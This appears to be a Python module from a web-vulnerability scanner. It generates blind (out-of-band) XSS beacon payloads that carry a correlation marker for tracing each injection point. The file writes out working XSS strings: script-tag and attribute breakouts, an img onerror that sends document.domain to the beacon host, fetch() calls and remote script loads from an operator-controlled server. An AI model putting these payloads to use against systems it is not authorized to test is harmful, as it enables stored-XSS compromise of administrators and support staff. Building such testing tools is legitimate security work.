"""Blind / out-of-band XSS payloads.

A blind XSS fires somewhere the scanner never navigates — an admin panel, a
support agent's inbox, a log viewer. No headless browser of ours can observe
it, so unlike every other vector in this scanner it cannot be *confirmed* here.
What it can do is deliver a beacon to a server the operator controls (an
interactsh / OAST host, XSS Hunter, Burp Collaborator) and record exactly which
injection point carried it, so when the beacon fires out of band the operator
can trace it back to the parameter that did it.

Honesty rule. A delivered blind payload is never reported as ``CONFIRMED``:
execution was not observed. It is recorded as a *delivery* — "this beacon went
into this parameter; watch your listener" — and nothing stronger. That keeps
the scanner's one rule intact: a finding is only as strong as its evidence.

Correlation. Every payload carries the finding's unique ``ixm…`` marker twice:
as a path segment (works with any HTTP collaborator) and, where the host allows
wildcard DNS, as a sub-domain (so a DNS-only interaction still names the point).
"""

from __future__ import annotations

from typing import List, Tuple
from urllib.parse import urlsplit


def normalize_oob(oob: str) -> Tuple[str, str]:
    """Return ``(scheme_relative_base, host)`` for an operator OOB target.

    Accepts ``host``, ``//host``, ``http(s)://host`` and forms carrying a path.
    The base is scheme-relative (``//host[/path]``) so a beacon inherits the
    victim page's scheme and works whether that page is HTTP or HTTPS.
    """
    raw = (oob or "").strip()
    if not raw:
        return "", ""
    if raw.startswith("//"):
        raw = "https:" + raw
    elif "://" not in raw:
        raw = "https://" + raw
    parts = urlsplit(raw)
    host = parts.netloc
    path = parts.path.rstrip("/")
    base = f"//{host}{path}"
    return base, host


def correlation_token(marker: str) -> str:
    """The path segment that ties a beacon back to its injection point."""
    marker = (marker or "").strip()
    return marker if marker.startswith("ixm") else f"ixm{marker}" if marker else "ixm"


def beacon_url(oob: str, marker: str) -> str:
    """Scheme-relative beacon URL: ``//host[/path]/ixm<marker>``."""
    base, _ = normalize_oob(oob)
    if not base:
        return ""
    return f"{base}/{correlation_token(marker)}"


def beacon_host(oob: str, marker: str) -> str:
    """Wildcard-DNS beacon host: ``ixm<marker>.<host>`` (for DNS-only oracles).

    Only meaningful when the OOB host answers wildcard DNS (interactsh / OAST
    do). The marker is hex, so it is always a legal DNS label.
    """
    _, host = normalize_oob(oob)
    if not host:
        return ""
    return f"{correlation_token(marker)}.{host}"


def build_blind_payloads(oob: str, marker: str) -> List[str]:
    """Context-spanning beacon payloads for one injection point.

    Covers the common reflection contexts the way a reflected scan would — an
    attribute/tag break-out, an inline event handler, a script-string break,
    and a bare injection for a sink that needs no break-out (stored HTML). Each
    loads ``url`` from an off-origin host so the beacon alone proves the code
    ran, and carries the marker for correlation.
    """
    url = beacon_url(oob, marker)
    if not url:
        return []
    dns = beacon_host(oob, marker)
    payloads = [
        # Tag/attribute break-out, double- and single-quoted.
        f'"><script src={url}></script>',
        f"'><script src={url}></script>",
        f'"><img src=x onerror=this.src="{url}?e="+document.domain>',
        f'"><svg onload=fetch("{url}")>',
        # Already inside a <script> block or a broken string.
        f"</script><script src={url}></script>",
        f"';var s=document.createElement('script');s.src='{url}';document.body.appendChild(s);//",
        # Inside an inline event / attribute value.
        f'" onmouseover=fetch(`{url}`) x="',
        # javascript: URL sink (href / location).
        f"javascript:fetch('{url}')",
        # Bare: a stored HTML sink that renders markup verbatim.
        f"<script src={url}></script>",
        # DNS-only oracle: a load from a wildcard sub-domain still names the
        # point even when no HTTP request is logged.
        f'"><script src=//{dns}/></script>',
    ]
    return payloads
